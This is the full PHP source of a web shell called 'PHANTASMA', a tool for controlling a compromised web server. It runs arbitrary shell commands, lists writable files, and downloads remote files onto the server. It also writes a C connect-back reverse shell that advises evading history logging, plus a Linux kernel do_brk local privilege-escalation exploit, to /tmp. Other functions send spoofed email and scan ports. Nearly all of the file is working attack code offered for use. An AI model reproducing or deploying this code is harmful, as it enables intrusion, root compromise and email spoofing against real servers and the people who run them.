<CENTER>
<DIV STYLE="font-family: verdana; font-size: 25px; font-weight: bold; color: #F3b700;">PHANTASMA- NeW CmD ;) </DIV>
<BR>
<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3b700;">Informa��o do sistema</DIV>
<?php

// 
  closelog( );

  $dono = get_current_user( );
  $ver = phpversion( );
  $login = posix_getuid( );
  $euid = posix_geteuid( );
  $gid = posix_getgid( );
  if ($chdir == "") $chdir = getcwd( );

?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0">
<?php

  $uname = posix_uname( );
  while (list($info, $value) = each ($uname)) {

?>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;"><?= $info ?>: <?= $value ?></DIV></TD>
  </TR>
<?php
  }
?>
 
  <TR>
   <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Script Current User: <?= $dono ?></DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">PHP Version: <?= $ver ?></DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">User Info: uid(<?= $login ?>) euid(<?= $euid ?>) gid(<?= $gid ?>)</DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Current Path: <?= $chdir ?></DIV></TD>
  </TR>
  <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Server IP: <?php $aaa =  gethostbyname($SERVER_NAME);  echo $aaa;?></DIV></TD>
  </TR>
   <TR>
    <TD><DIV STYLE="font-family: verdana; font-size: 15px;">Web Server: <?= "$SERVER_SOFTWARE $SERVER_VERSION"; ?></DIV></TD>
  </TR>
</TABLE>
<BR>
<?php

  if ($cmd != "") {
    echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Command Mode Run</DIV>";

?>

<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Command Stdout</DIV>
<?php

if ($fe == 1){
$fe = "exec";
}
if ($fe == ""){
$fe = "passthru";
}
if ($fe == "2"){
$fe = "system";
}

    if (isset($chdir)) @chdir($chdir);

    ob_start( );
      $fe("$cmd  2>&1");
      $output = ob_get_contents();
    ob_end_clean( );

?>
<TEXTAREA COLS="75" ROWS="8" STYLE="font-family: verdana; font-size: 12px;">
<?php

    if (!empty($output)) echo str_replace(">", "&gt;", str_replace("<", "&lt;", $output));
?>
</TEXTAREA>
<BR>
<?php

  }
 
  if ($safemode != "") {
    echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Safemode Mode Run</DIV>";

?>
<DIV STYLE="font-family: verdana; font-size: 20px; font-weight: bold; color: #F3A700;">Safe Mode Directory Listing</DIV>
<?php

    if ($dir = @opendir($chdir)) {
      echo "<TABLE border=1 cellspacing=1 cellpadding=0>";
      echo "<TR>";
      echo "<TD valign=top>";
      echo "<b><font size=2 face=arial>List All Files</b> <br><br>";
      while (($file = readdir($dir)) !== false) {
        if (@is_file($file)) {
          $file1 = fileowner($file);
          $file2 = fileperms($file);
    	  echo "<font color=green>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"; 
	  // echo "<font color=green>$file1 - $file2 - $file </font><br>";
          flush( );
        }
      }

      echo "</TD>";
      echo"<TD valign=top>";
      echo "<b><font size=2 face=arial>List Only Folders</b> <br><br>";
      if ($dir = @opendir($chdir)) {
        while (($file = readdir($dir)) !== false) {
          if (@is_dir($file)) {
            $file1 = fileowner($file);
            $file2 = fileperms($file);
	    echo "<font color=blue>$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&chdir=$chdir/$file>$file</a><br>"; 
            // echo "<font color=blue>$file1 - $file2 - $file </font><br>";
          }
        }
      }
      echo "</TD>";
      echo"<TD valign=top>";
      echo "<b><font size=2 face=arial>List Writable Folders</b><br><br>";
      if ($dir = @opendir($chdir)) {
        while (($file = readdir($dir)) !== false) {
          if (@is_writable($file) && @is_dir($file)) {
            $file1 = fileowner($file);
            $file2 = fileperms($file);
            echo "<font color=red>$file1 - $file2 - $file </font><br>";
          }
        }
      }
      echo "</TD>";
      echo "</TD>";
      echo "<TD valign=top>";
      echo "<b><font size=2 face=arial>List Writable Files</b> <br><br>";
 
      if ($dir = opendir($chdir)) {
        while (($file = readdir($dir)) !== false) {
          if (@is_writable($file) && @is_file($file)) {
            $file1 = fileowner($file);
            $file2 = fileperms($file);
    	    echo "<font color=red>$file1 - $file2 - $file </font><br>";
          }
        }
      }
      echo "</TD>";
      echo "</TR>";
      echo "</TABLE>";
    }
  }

?>
<?php

  if ($shell == "write") {
    $shell = "#include <stdio.h>\n" .
             "#include <sys/socket.h>\n" .
             "#include <netinet/in.h>\n" .
             "#include <arpa/inet.h>\n" .
             "#include <netdb.h>\n" .
             "int main(int argc, char **argv) {\n" .
             "  char *host;\n" .
             "  int port = 80;\n" .
             "  int f;\n" .
             "  int l;\n" .
             "  int sock;\n" .
             "  struct in_addr ia;\n" .
             "  struct sockaddr_in sin, from;\n" .
             "  struct hostent *he;\n" .
             "  char msg[ ] = \"Welcome to Data Cha0s Connect Back Shell\\n\\n\"\n" .
             "                \"Issue \\\"export TERM=xterm; exec bash -i\\\"\\n\"\n" .
             "                \"For More Reliable Shell.\\n\"\n" .
             "                \"Issue \\\"unset HISTFILE; unset SAVEHIST\\\"\\n\"\n" .
             "                \"For Not Getting Logged.\\n(;\\n\\n\";\n" .
             "  printf(\"Data Cha0s Connect Back Backdoor\\n\\n\");\n" .
             "  if (argc < 2 || argc > 3) {\n" .
             "    printf(\"Usage: %s [Host] <port>\\n\", argv[0]);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Dumping Arguments\\n\");\n" .
             "  l = strlen(argv[1]);\n" .
             "  if (l <= 0) {\n" .
             "    printf(\"[-] Invalid Host Name\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (!(host = (char *) malloc(l))) {\n" .
             "    printf(\"[-] Unable to Allocate Memory\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  strncpy(host, argv[1], l);\n" .
             "  if (argc == 3) {\n" .
             "    port = atoi(argv[2]);\n" .
             "    if (port <= 0 || port > 65535) {\n" .
             "      printf(\"[-] Invalid Port Number\\n\");\n" .
             "      return 1;\n" .
             "    }\n" .
             "  }\n" .
             "  printf(\"[*] Resolving Host Name\\n\");\n" .
             "  he = gethostbyname(host);\n" .
             "  if (he) {\n" .
             "    memcpy(&ia.s_addr, he->h_addr, 4);\n" .
             "  } else if ((ia.s_addr = inet_addr(host)) == INADDR_ANY) {\n" .
             "    printf(\"[-] Unable to Resolve: %s\\n\", host);\n" .
             "    return 1;\n" .
             "  }\n" .
             "  sin.sin_family = PF_INET;\n" .
             "  sin.sin_addr.s_addr = ia.s_addr;\n" .
             "  sin.sin_port = htons(port);\n" .
             "  printf(\"[*] Connecting...\\n\");\n" .
             "  if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1) {\n" .
             "    printf(\"[-] Socket Error\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  if (connect(sock, (struct sockaddr *)&sin, sizeof(sin)) != 0) {\n" .
             "    printf(\"[-] Unable to Connect\\n\");\n" .
             "    return 1;\n" .
             "  }\n" .
             "  printf(\"[*] Spawning Shell\\n\");\n" .
             "  f = fork( );\n" .
             "  if (f < 0) {\n" .
             "    printf(\"[-] Unable to Fork\\n\");\n" .
             "    return 1;\n" .
             "  } else if (!f) {\n" .
             "    write(sock, msg, sizeof(msg));\n" .
             "    dup2(sock, 0);\n" .
             "    dup2(sock, 1);\n" .
             "    dup2(sock, 2);\n" .
             "    execl(\"/bin/sh\", \"shell\", NULL);\n" .
             "    close(sock);\n" .
             "    return 0;\n" .
             "  }\n" .
             "  printf(\"[*] Detached\\n\\n\");\n" .
             "  return 0;\n" .
             "}\n";

    $fp = fopen("/tmp/dc-connectback.c", "w");
    $ok = fwrite($fp, $shell);

    if (!empty($ok)) {
      echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Connect Back Shell Was Successfuly Copied</DIV>";
    } else {
      echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Copying Shell</DIV>";
    }
  }

  if ($kernel == "write") {
    $kernel = "/*\n" .
              " * hatorihanzo.c\n" .
              " * Linux kernel do_brk vma overflow exploit.\n" .
              " *\n" .
              " * The bug was found by Paul (IhaQueR) Starzetz <paul@isec.pl>\n" .
              " *\n" .
              " * Further research and exploit development by\n" .
              " * Wojciech Purczynski <cliph@isec.pl> and Paul Starzetz.\n" .
              " *\n" .
              " * (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.\n" .
              " *\n" .
              " * COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE\n" .
              " * OF PRESENTED CODE IS STRICTLY PROHIBITED.\n" .
              "*/\n" .
              "#define _GNU_SOURCE\n" .
              "#include <stdio.h>\n" .
              "#include <stdlib.h>\n" .
              "#include <errno.h>\n" .
              "#include <string.h>\n" .
              "#include <unistd.h>\n" .
              "#include <fcntl.h>\n" .
              "#include <signal.h>\n" .
              "#include <paths.h>\n" .
              "#include <grp.h>\n" .
              "#include <setjmp.h>\n" .
              "#include <stdint.h>\n" .
              "#include <sys/mman.h>\n" .
              "#include <sys/ipc.h>\n" .
              "#include <sys/shm.h>\n" .
              "#include <sys/ucontext.h>\n" .
              "#include <sys/wait.h>\n" .
              "#include <asm/ldt.h>\n" .
              "#include <asm/page.h>\n" .
              "#include <asm/segment.h>\n" .
              "#include <linux/unistd.h>\n" .
              "#include <linux/linkage.h>\n" .
              "#define kB   * 1024\n" .
              "#define MB   * 1024 kB\n" .
              "#define GB   * 1024 MB\n" .
              "#define MAGIC             0xdefaced /* I should've patented this number -cliph */\n" .
              "#define ENTRY_MAGIC 0\n" .
              "#define ENTRY_GATE 2\n" .
              "#define ENTRY_CS    4\n" .
              "#define ENTRY_DS    6\n" .
              "#define CS          ((ENTRY_CS << 2) | 4)\n" .
              "#define DS          ((ENTRY_DS << 2) | 4)\n" .
              "#define GATE        ((ENTRY_GATE << 2) | 4 | 3)\n" .
              "#define LDT_PAGES   ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)\n" .
              "#define TOP_ADDR    0xFFFFE000U\n" .
              "/* configuration */\n" .
              "unsigned     task_size;\n" .
              "unsigned     page;\n" .
              "uid_t        uid;\n" .
              "unsigned     address;\n" .
              "int dontexit = 0;\n" .
              "void fatal(char * msg)\n" .
              "{\n" .
              "      fprintf(stderr, \"[-] %s: %s\\n\", msg, strerror(errno));\n" .
              "      if (dontexit) {\n" .
              "             fprintf(stderr, \"[-] Unable to exit, entering neverending loop.\\n\");\n" .
              "             kill(getpid(), SIGSTOP);\n" .
              "             for (;;) pause();\n" .
              "      }\n" .
              "      exit(EXIT_FAILURE);\n" .
              "}\n" .
              "void configure(void)\n" .
              "{\n" .
              "      unsigned val;\n" .
              "      task_size = ((unsigned)&val + 1 GB ) / (1 GB) * 1 GB;\n" .
              "      uid = getuid();\n" .
              "}\n" .
              "void expand(void)\n" .
              "{\n" .
              "      unsigned top = (unsigned) sbrk(0);\n" .
              "      unsigned limit = address + PAGE_SIZE;\n" .
              "      do {\n" .
              "             if (sbrk(PAGE_SIZE) == NULL)\n" .
              "                   fatal(\"Kernel seems not to be vulnerable\");\n" .
              "             dontexit = 1;\n" .
              "             top += PAGE_SIZE;\n" .
              "      } while (top < limit);\n" .
              "}\n" .
              "jmp_buf jmp;\n" .
              "#define MAP_NOPAGE 1\n" .
              "#define MAP_ISPAGE 2\n" .
              "void sigsegv(int signo, siginfo_t * si, void * ptr)\n" .
              "{\n" .
              "      struct ucontext * uc = (struct ucontext *) ptr;\n" .
              "      int error_code = uc->uc_mcontext.gregs[REG_ERR];\n" .
              "      (void)signo;\n" .
              "      (void)si;\n" .
              "      error_code = MAP_NOPAGE + (error_code & 1);\n" .
              "      longjmp(jmp, error_code);\n" .
              "}\n" .
              "void prepare(void)\n" .
              "{\n" .
              "      struct sigaction sa;\n" .
              "      sa.sa_sigaction = sigsegv;\n" .
              "      sa.sa_flags = SA_SIGINFO | SA_NOMASK;\n" .
              "      sigemptyset(&sa.sa_mask);\n" .
              "      sigaction(SIGSEGV, &sa, NULL);\n" .
              "}\n" .
              "int testaddr(unsigned addr)\n" .
              "{\n" .
              "      int val;\n" .
              "      val = setjmp(jmp);\n" .
              "      if (val == 0) {\n" .
              "             asm (\"verr (%%eax)\" : : \"a\" (addr));\n" .
              "             return MAP_ISPAGE;\n" .
              "      }\n" .
              "      return val;\n" .
              "}\n" .
              "#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)\n" .
              "#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))\n" .
              "#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)\n" .
              "void map(unsigned * map)\n" .
              "{\n" .
              "      unsigned addr = task_size;\n" .
              "      unsigned bit = 1;\n" .
              "      prepare();\n" .
              "      while (addr < TOP_ADDR) {\n" .
              "             if (testaddr(addr) == MAP_ISPAGE)\n" .
              "                   *map |= bit;\n" .
              "             addr += PAGE_SIZE;\n" .
              "             next(map, bit);\n" .
              "      }\n" .
              "      signal(SIGSEGV, SIG_DFL);\n" .
              "}\n" .
              "void find(unsigned * m)\n" .
              "{\n" .
              "      unsigned addr = task_size;\n" .
              "      unsigned bit = 1;\n" .
              "      unsigned count;\n" .
              "      unsigned tmp;\n" .
              "      prepare();\n" .
              "      tmp = address = count = 0U;\n" .
              "      while (addr < TOP_ADDR) {\n" .
              "             int val = testaddr(addr);\n" .
              "             if (val == MAP_ISPAGE && (*m & bit) == 0) {\n" .
              "                   if (!tmp) tmp = addr;\n" .
              "                   count++;\n" .
              "             } else {\n" .
              "                   if (tmp && count == LDT_PAGES) {\n" .
              "                          errno = EAGAIN;\n" .
              "                          if (address)\n" .
              "                                fatal(\"double allocation\\n\");\n" .
              "                          address = tmp;\n" .
              "                   }\n" .
              "                   tmp = count = 0U;\n" .
              "             }\n" .
              "             addr += PAGE_SIZE;\n" .
              "             next(m, bit);\n" .
              "      }\n" .
              "      signal(SIGSEGV, SIG_DFL);\n" .
              "      if (address)\n" .
              "             return;\n" .
              "      errno = ENOTSUP;\n" .
              "      fatal(\"Unable to determine kernel address\");\n" .
              "}\n" .
              "int modify_ldt(int, void *, unsigned);\n" .
              "void ldt(unsigned * m)\n" .
              "{\n" .
              "      struct modify_ldt_ldt_s l;\n" .
              "      map(m);\n" .
              "      memset(&l, 0, sizeof(l));\n" .
              "      l.entry_number = LDT_ENTRIES - 1;\n" .
              "      l.seg_32bit = 1;\n" .
              "      l.base_addr = MAGIC >> 16;\n" .
              "      l.limit = MAGIC & 0xffff;\n" .
              "      if (modify_ldt(1, &l, sizeof(l)) == -1)\n" .
              "             fatal(\"Unable to set up LDT\");\n" .
              "      l.entry_number = ENTRY_MAGIC / 2;\n" .
              "      if (modify_ldt(1, &l, sizeof(l)) == -1)\n" .
              "             fatal(\"Unable to set up LDT\");\n" .
              "      find(m);\n" .
              "}\n" .
              "asmlinkage void kernel(unsigned * task)\n" .
              "{\n" .
              "      unsigned * addr = task;\n" .
              "      /* looking for uids */\n" .
              "      while (addr[0] != uid || addr[1] != uid ||\n" .
              "             addr[2] != uid || addr[3] != uid)\n" .
              "             addr++;\n" .
              "      addr[0] = addr[1] = addr[2] = addr[3] = 0;    /* uids */\n" .
              "      addr[4] = addr[5] = addr[6] = addr[7] = 0;    /* uids */\n" .
              "      addr[8] = 0;\n" .
              "      /* looking for vma */\n" .
              "      for (addr = (unsigned *) task_size; addr; addr++) {\n" .
              "             if (addr[0] >= task_size && addr[1] < task_size &&\n" .
              "                 addr[2] == address && addr[3] >= task_size) {\n" .
              "                   addr[2] = task_size - PAGE_SIZE;\n" .
              "                   addr = (unsigned *) addr[3];\n" .
              "                   addr[1] = task_size - PAGE_SIZE;\n" .
              "                   addr[2] = task_size;\n" .
              "                   break;\n" .
              "             }\n" .
              "      }\n" .
              "}\n" .
              "void kcode(void);\n" .
              "#define __str(s) #s\n" .
              "#define str(s) __str(s)\n" .
              "void __kcode(void)\n" .
              "{\n" .
              "      asm(\n" .
              "             \"kcode:                                \\n\"\n" .
              "             \"     pusha                            \\n\"\n" .
              "             \"     pushl %es                        \\n\"\n" .
              "             \"     pushl %ds                        \\n\"\n" .
              "             \"     movl   $(\" str(DS) \") ,%edx      \\n\"\n" .
              "             \"     movl   %edx,%es                  \\n\"\n" .
              "             \"     movl   %edx,%ds                  \\n\"\n" .
              "             \"     movl   $0xffffe000,%eax          \\n\"\n" .
              "             \"     andl   %esp,%eax                 \\n\"\n" .
              "             \"     pushl %eax                       \\n\"\n" .
              "             \"     call   kernel                    \\n\"\n" .
              "             \"     addl   $4, %esp                  \\n\"\n" .
              "             \"     popl   %ds                       \\n\"\n" .
              "             \"     popl   %es                       \\n\"\n" .
              "             \"     popa                             \\n\"\n" .
              "             \"     lret                             \\n\"\n" .
              "      );\n" .
              "}\n" .
              "void knockout(void)\n" .
              "{\n" .
              "      unsigned * addr = (unsigned *) address;\n" .
              "      if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)\n" .
              "             fatal(\"Unable to change page protection\");\n" .
              "      errno = ESRCH;\n" .
              "      if (addr[ENTRY_MAGIC] != MAGIC)\n" .
              "             fatal(\"Invalid LDT entry\");\n" .
              "      /* setting call gate and privileged descriptors */\n" .
              "      addr[ENTRY_GATE+0] = ((unsigned)CS << 16) | ((unsigned)kcode & 0xffffU);\n" .
              "      addr[ENTRY_GATE+1] = ((unsigned)kcode & ~0xffffU) | 0xec00U;\n" .
              "      addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */\n" .
              "      addr[ENTRY_CS+1] = 0x00cf9a00U;\n" .
              "      addr[ENTRY_DS+0] = 0x0000ffffU; /* user   4GB code at 0x00000000 */\n" .
              "      addr[ENTRY_DS+1] = 0x00cf9200U;\n" .
              "      prepare();\n" .
              "      if (setjmp(jmp) != 0) {\n" .
              "             errno = ENOEXEC;\n" .
              "             fatal(\"Unable to jump to call gate\");\n" .
              "      }\n" .
              "      asm(\"lcall $\" str(GATE) \",$0x0\");      /* this is it */\n" .
              "}\n" .
              "void shell(void)\n" .
              "{\n" .
              "      char * argv[] = { _PATH_BSHELL, NULL };\n" .
              "      execve(_PATH_BSHELL, argv, environ);\n" .
              "      fatal(\"Unable to spawn shell\\n\");\n" .
              "}\n" .
              "void remap(void)\n" .
              "{\n" .
              "      static char stack[8 MB];  /* new stack */\n" .
              "      static char * envp[] = { \"PATH=\" _PATH_STDPATH, NULL };\n" .
              "      static unsigned * m;\n" .
              "      static unsigned b;\n" .
              "      m = (unsigned *) sbrk(map_size);\n" .
              "      if (!m)\n" .
              "             fatal(\"Unable to allocate memory\");\n" .
              "      environ = envp;\n" .
              "      asm (\"movl %0, %%esp\\n\" : : \"a\" (stack + sizeof(stack)));\n" .
              "      b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) & PAGE_MASK;\n" .
              "      if (munmap((void*)b, task_size - b) == -1)\n" .
              "             fatal(\"Unable to unmap stack\");\n" .
              "      while (b < task_size) {\n" .
              "             if (sbrk(PAGE_SIZE) == NULL)\n" .
              "                   fatal(\"Unable to expand BSS\");\n" .
              "             b += PAGE_SIZE;\n" .
              "      }\n" .
              "      ldt(m);\n" .
              "      expand();\n" .
              "      knockout();\n" .
              "      shell();\n" .
              "}\n" .
              "int main(void)\n" .
              "{\n" .
              "      configure();\n" .
              "      remap();\n" .
              "      return EXIT_FAILURE;\n" .
              "}\n";

    $fp = fopen("/tmp/xpl_brk.c", "w");
    $ok = fwrite($fp, $kernel);
    
    if (!empty($ok)) {
      echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Linux Local Kernel Exploit Was Successfuly Copied</DIV>";
    } else {
      echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Copying Kernel Exploit</DIV>";
    }
  }

?>
</CENTER>
<pre><font face="Tahoma" size="2">
<?php

// Function to Visualize Source Code files 
if ($see != "") {
  $fp = fopen($see, "r"); 
  $read = fread($fp, 30000); 
  echo "============== $see ================<br>";
  echo "<textarea name=textarea cols=80 rows=15>"; 
  echo "$read"; 
  Echo "</textarea>"; 
}

// Function to Dowload Local Xploite Binary COde or Source Code

if ($dx != "") {
  $fp = @fopen("$hostxpl",r);
  $fp2 = @fopen("$storage","w");
  fwrite($fp2, "");
  $fp1 = @fopen("$storage","a+");
  for (;;) {
    $read = @fread($fp, 4096);
    if (empty($read)) break;
    $ok = fwrite($fp1, $read);
    
    if (empty($ok)) {
      echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Uploading File</DIV>";
      break;
    }
  }

  if (!empty($ok)) {
    echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] File Was Successfuly Uploaded</DIV>";
  }
}

flush( );

// Function to visulize Format Color Source Code PHP

if ($sfc != "") {
  $showcode = show_source("$sfc");
  echo "<font size=4> $showcode </font>";
}

// Function to Visualize all infomation files
if ($fileinfo != "") {
  $infofile = stat("$fileanalize");
  while (list($info, $value) = each ($infofile)) {
    echo" Info: $info  Value: $value <br>";
  }
}

// Function to send fake mail
if ($fake == 1) {
  echo "<FORM METHOD=POST ACTION=\"$SCRIPT_NAME?$QUERY_STRING&send=1\">";
  echo "Your Fake Mail <INPUT TYPE=\"\" NAME=\"yourmail\"><br>";
  echo "Your Cavy:<INPUT TYPE=\"\" NAME=\"cavy\"><br>";
  echo "Suject: <INPUT TYPE=\"text\" NAME=\"subject\"><br>";
  echo "Text: <TEXTAREA NAME=\"body\" ROWS=\"\" COLS=\"\"></TEXTAREA><br>";
  echo "<INPUT TYPE=\"hidden\" NAME=\"send\" VALUE=\"1\"><br>";
  echo "<INPUT TYPE=\"submit\" VALUE=\"Send Fake Mail\">";
  echo "</FORM>";
}

if($send == 1) {
  if (mail($cavy, $subject, $body, "From: $yourmail\r\n")) {
    echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[*] Mail Send Sucessfuly</DIV>";
  } else {
    echo "<DIV STYLE=\"font-family: verdana; font-size: 15px;\">[-] An Error Has Ocurred While Sending Mail</DIV>";
  }
}

if ($portscan != "") {
  $port = array ("21","22","23","25","110",);
  $values = count($port);
  for ($cont=0; $cont < $values; $cont++) {
    @$sock[$cont] = Fsockopen($SERVER_NAME, $port[$cont], $oi, $oi2, 1);
    $service = Getservbyport($port[$cont],"tcp");
    @$get = fgets($sock[$cont]);
    echo "<br>Port: $port[$cont] - Service: $service<br><br>";
    echo "<br>Banner: $get <br><br>";
    flush();
  }
}

?> 
</font></pre>